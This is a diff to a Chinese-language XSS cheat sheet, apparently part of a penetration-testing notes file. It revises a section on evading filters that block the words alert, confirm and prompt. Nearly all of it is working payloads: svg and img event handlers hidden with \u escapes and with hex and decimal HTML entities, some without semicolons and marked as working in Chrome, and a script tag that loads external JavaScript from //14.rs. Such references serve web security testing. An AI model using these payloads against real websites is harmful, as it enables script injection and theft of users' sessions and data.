@@ -217,6 +217,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ...
 ```
 
+
 ### XSS payload 变形
 
 * 参考
@@ -272,45 +273,38 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 <svg onload=confirm()//
 ```
 
-- 使用编码 "变形" 不出现字符串 `alert` `confirm` `prompt`
+- 不出现字符串 `alert` `confirm` `prompt`
 
 ```
-# <script src=外部js文件
+# 外联js文件
 <script src=//14.rs></script>
 ```
 
+事件标签可用的编码方式:\u (Hexadecimal)
 ```
-# 事件标签的编码方式 \u编码
+# 事件标签可用的编码方式 \u编码
 <svg onload=co\u006efirm()>
 <svg onload=z=co\u006efir\u006d,z()>
 ```
 
+事件标签可用的编码方式:HTML Entity (Hexadecimal)
 ```
-# 事件标签的编码方式 html实体编码(必须带分号;)
-
-例1
-
-原始payload
-<svg/onload="javascript:alert(1)">
-
-html实体编码 十六进制
-<svg/onload="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
-
-html实体编码 十进制
-<svg/onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
-
-----
-
-例2
-
-原始payload
-<svg/onload=alert(2)>
-
-html实体编码 十六进制
+html实体编码 十六进制  ( 如 字符a ->  &#x0061; )
 <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x32;&#x29;>
+
+html实体编码 十六进制 (不带分号 chrome下可行)
+<IMG src onerror=&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+```
+
+事件标签可用的编码方式:HTML Entity (Decimal)
+```
+原始payload为 alert(1)  也可以是更长的 javascript:alert(1)
 
 html实体编码 十进制
 <svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#50;&#41;>
+
+html实体编码 十进制 (不带分号 chrome下可行)
+<svg/onload=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41>
 ```
 
 - 不使用有效的html标签
